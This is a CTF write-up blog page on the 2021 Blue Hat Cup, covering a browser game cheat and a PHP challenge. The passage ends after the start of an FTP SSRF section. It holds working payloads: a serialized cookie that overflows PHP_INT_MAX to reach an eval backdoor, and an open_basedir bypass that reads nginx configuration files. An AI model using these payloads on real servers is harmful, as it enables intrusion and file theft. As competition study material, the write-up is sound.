@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebBall_siginegret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在hitWordLetter() 方法下有如下逻辑。 123if (this._score &#x3D;&#x3D;&#x3D; 60) &amp;#123;	this.gameOverFunc();&amp;#125;  也就是只要分数达到">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-CN/posts/e43fbefd.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="WebBall_siginegret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在hitWordLetter() 方法下有如下逻辑。 123if (this._score &#x3D;&#x3D;&#x3D; 60) &amp;#123;	this.gameOverFunc();&amp;#125;  也就是只要分数达到">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325.4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697410922.9a61625f26a8fcbfcfd85c5661c44861ce5d0534.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1620049443407.2dd7c47cdc393ff1db87508c1ea764be60013542.png">
+<meta property="article:published_time" content="2021-05-07T10:07:00.000Z">
+<meta property="article:modified_time" content="2021-05-07T10:22:37.359Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325.4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>蓝帽杯 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-TW/posts/289e3997.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="#">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="/zh-TW/posts/e43fbefd.html">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&text=蓝帽杯 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&is_video=false&description=蓝帽杯 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蓝帽杯 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/e43fbefd.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&title=蓝帽杯 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&name=蓝帽杯 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/e43fbefd.html&t=蓝帽杯 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ball-sigin"><span class="toc-number">1.1.</span> <span class="toc-text">Ball_sigin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-Pointer-php"><span class="toc-number">1.2.</span> <span class="toc-text">one_Pointer_php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-INT-MAX-%E5%AF%BC%E8%87%B4%E8%B5%8B%E5%80%BC%E6%8A%A5%E9%94%99"><span class="toc-number">1.2.1.</span> <span class="toc-text">PHP_INT_MAX 导致赋值报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-SSRF-%E6%94%BB%E5%87%BB-PHP-FPM-FastCGI"><span class="toc-number">1.2.2.</span> <span class="toc-text">FTP SSRF 攻击 PHP-FPM&#x2F;FastCGI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%AC%E5%A5%A5%E4%BC%9A-is-coming"><span class="toc-number">2.1.</span> <span class="toc-text">冬奥会_is_coming</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        蓝帽杯 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-05-07T10:07:00.000Z" itemprop="datePublished">2021-05-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h3><p>egret 引擎开发的小游戏，主要的代码都在 Games.js 中。主要的玩法是操作小球滑动躲避树并收集对应左上角单词缺失的字母。将 Games.js 下载下来后格式化，可以发现在<code>hitWordLetter()</code> 方法下有如下逻辑。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>._score === <span class="number">60</span>) &#123;</span><br><span class="line">	<span class="built_in">this</span>.gameOverFunc();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是只要分数达到六十分即可获胜，定位到 <code>gameOverFunc()</code> 可以发现获胜结果是通过向 <code>/testData</code> 发送 POST 请求从服务端获取的，其中提交的数据结构如下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> datas = &#123;</span><br><span class="line">	<span class="string">&#x27;balls&#x27;</span>: <span class="built_in">this</span>._balls,</span><br><span class="line">	<span class="string">&#x27;trees&#x27;</span>: <span class="built_in">this</span>._trees,</span><br><span class="line">	<span class="string">&#x27;words&#x27;</span>: <span class="built_in">this</span>._words,</span><br><span class="line">	<span class="string">&#x27;infos&#x27;</span>: <span class="built_in">this</span>._infos</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>gameOverFunc()</code> 处的判断改一下，使其无论分数多少都提交数据，从而得到如下提交样例。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697838325.4f1b9e467ccf84e6a2b596cef2bfc5c88fb973d1.png"></p>
+<p>可以发现树的位置和单词的位置以及小球的位置都会被实时记录，因此想要手动伪造一份记录十分困难。定位到 <code>addBarriers()</code> 方法可以发现树的坐标是随机生成的，因此可以稍作修改使树排排站。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">treeBg.x = <span class="number">1</span>;</span><br><span class="line">treeBg.y = <span class="built_in">Math</span>.random() * (<span class="built_in">this</span>._stageH - <span class="number">80</span> - (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>)) + (<span class="built_in">this</span>._isFitstApperar ? <span class="number">500</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用 Fiddler 拦截请求来替换 Games.js，即可轻松完成游戏设定的目标。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://butter.lumosary.workers.dev/images/archive/7f363bdc-676b-4e98-b8ef-59cfda4fd170/1619697410922.9a61625f26a8fcbfcfd85c5661c44861ce5d0534.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f2852395-1f2b-47a6-bd29-cd54bb67a614&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h3><blockquote>
+<p>how to change my euid？</p>
+</blockquote>
+<h4 id="PHP-INT-MAX-导致赋值报错"><a href="#PHP-INT-MAX-导致赋值报错" class="headerlink" title="PHP_INT_MAX 导致赋值报错"></a>PHP_INT_MAX 导致赋值报错</h4><p>下载题目给出的附件，可以得到如下代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很容易发现判断的语句是一个赋值语句，因此需要尝试让赋值语句返回 <code>false</code>。恰巧赋值的是一个数组，当数组的下标达到 <code>PHP_INT_MAX</code> 即 9223372036854775807 时再次使用 <code>$count[]=1</code> 增加新的数组元素时即会失败。因此只要让 <code>$count</code> 的值为 <code>PHP_INT_MAX</code> 即可，构造出如下序列化脚本。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span> = PHP_INT_MAX - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> User);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行脚本得到了如下载荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;count&quot;</span>;i:<span class="number">9223372036854775806</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将载荷拼接到 <code>$_COOKIE[&quot;data&quot;]</code> 中即可到达 <code>eval($_GET[&quot;backdoor&quot;]);</code>，从而执行一部分指令。执行 <code>phpinfo()</code> 可以发现靶机所使用的是 PHP 7.4.16，且有如下 disable_functions 和 disable_classes。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br><span class="line"></span><br><span class="line">	Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br></pre></td></tr></table></figure>
+
+<h4 id="FTP-SSRF-攻击-PHP-FPM-FastCGI"><a href="#FTP-SSRF-攻击-PHP-FPM-FastCGI" class="headerlink" title="FTP SSRF 攻击 PHP-FPM/FastCGI"></a>FTP SSRF 攻击 PHP-FPM/FastCGI</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">https://whoamianony.top/2021/05/02/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></p>
+</blockquote>
+<p>在 phpinfo 中可以发现设置了 open_basedir，因此稍微用 <code>chdir()</code> 与 <code>ini_set()</code> 组合来绕过一下可以得到如下载荷来读到 nginx 的配置文件，从而可以得到 FastCGI 的端口。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?backdoor&#x3D;mkdir(%27h3x%27);chdir(%27h3x%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);echo file_get_contents(&#39;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;default&#39;);</span><br></pre></td></tr></table></figure>
+
